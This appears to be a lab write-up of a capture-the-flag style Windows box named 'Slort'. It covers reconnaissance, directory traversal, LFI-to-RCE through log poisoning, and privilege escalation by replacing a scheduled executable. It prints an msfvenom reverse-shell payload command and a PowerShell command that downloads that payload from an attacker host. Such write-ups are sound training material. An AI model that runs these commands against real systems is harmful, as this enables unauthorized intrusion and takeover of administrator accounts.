---
icon: windows
---

# Slort - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.194.53 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-05 15:47 EDT
Nmap scan report for 192.168.194.53
Host is up (0.030s latency).
Not shown: 65520 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd 0.9.41 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql         MariaDB 10.3.24 or later (unauthorized)
4443/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.194.53:4443/dashboard/
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8080/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.194.53:8080/dashboard/
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-open-proxy: Proxy might be redirecting requests
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=10/5%OT=21%CT=1%CU=37275%PV=Y%DS=4%DC=T%G=Y%TM=68E2CC4
OS:4%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10B%TI=I%CI=I%TS=U)SEQ(SP=1
OS:05%GCD=1%ISR=108%TI=I%CI=I%TS=U)SEQ(SP=106%GCD=1%ISR=106%TI=I%CI=I%TS=U)
OS:SEQ(SP=106%GCD=1%ISR=109%TI=I%CI=I%TS=U)SEQ(SP=FF%GCD=1%ISR=10F%TI=I%CI=
OS:I%TS=U)OPS(O1=M578NW8NNS%O2=M578NW8NNS%O3=M578NW8%O4=M578NW8NNS%O5=M578N
OS:W8NNS%O6=M578NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN
OS:(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 2s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-10-05T19:51:21
|_  start_date: N/A

TRACEROUTE (using port 111/tcp)
HOP RTT      ADDRESS
1   40.97 ms 192.168.45.1
2   38.24 ms 192.168.45.254
3   41.11 ms 192.168.251.1
4   41.36 ms 192.168.194.53
```

### <mark style="color:$primary;">HTTP Port 8080 TCP</mark>

<figure><img src="../../.gitbook/assets/image (682).png" alt=""><figcaption></figcaption></figure>

Visiting the port we are meet with a default XAMPP Page

#### Directory Busting

```
dirsearch -u http://192.168.194.53:8080/
```

<figure><img src="../../.gitbook/assets/image (683).png" alt=""><figcaption></figcaption></figure>

Reveals a redirect on site, I am going to check it out

<figure><img src="../../.gitbook/assets/image (684).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Directory Traversal</mark>

<figure><img src="../../.gitbook/assets/image (685).png" alt=""><figcaption></figcaption></figure>

Discovered directory traversal

<figure><img src="../../.gitbook/assets/image (686).png" alt=""><figcaption></figcaption></figure>

We know this is an apache web server

### <mark style="color:$primary;">LFI -> RCE</mark>

<figure><img src="../../.gitbook/assets/image (687).png" alt=""><figcaption></figcaption></figure>

This shows that our User Agent is included in the log entry next to our ip. Before we send a request, we can modify the User Agent in Burp and specify what will be written to the access.log file.

<figure><img src="../../.gitbook/assets/image (689).png" alt=""><figcaption></figcaption></figure>

The PHP code snippet was written to Apache’s access.log file. By including the log file via the LFI vulnerability, we can execute the PHP code snippet. To execute our snippet, we’ll first update the page parameter in the current Burp request with a relative path.

We’ll also remove the User Agent line from the current Burp request to avoid poisoning the log again

<figure><img src="../../.gitbook/assets/image (690).png" alt=""><figcaption></figcaption></figure>

To get a reverse shell I am going to use [https://www.revshells.com/](https://www.revshells.com/)&#x20;

<figure><img src="../../.gitbook/assets/image (691).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (692).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (693).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

<figure><img src="../../.gitbook/assets/image (695).png" alt=""><figcaption></figcaption></figure>

Discovered an executable that I assume is being run by the Administrator every 5 minutes and we have Full Control rights on it. I will replace the TFTP executable with a reverse shell payload. If it gets executed with SYSTEM privileges, we’ll get a reverse shell in 5 minutes

### <mark style="color:$primary;">Scheduled binary privesc</mark>

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.158 LPORT=443 -f exe > reverse.exe
```

<figure><img src="../../.gitbook/assets/image (696).png" alt=""><figcaption></figcaption></figure>

Now I am going to transfer it to the target machine and replace the TFTP.EXE executable with my reverse shell executable

```
iwr -uri http://192.168.45.158/reverse.exe -outfile reverse.exe
move TFTP.exe TFTP.exe.bk
move reverse.exe TFTP.exe
```

<figure><img src="../../.gitbook/assets/image (697).png" alt=""><figcaption></figcaption></figure>

Make sure you have a listener ready and wait for TFTP.EXE to be executed

<figure><img src="../../.gitbook/assets/image (2419).png" alt=""><figcaption></figcaption></figure>

We got a shell as administrator!
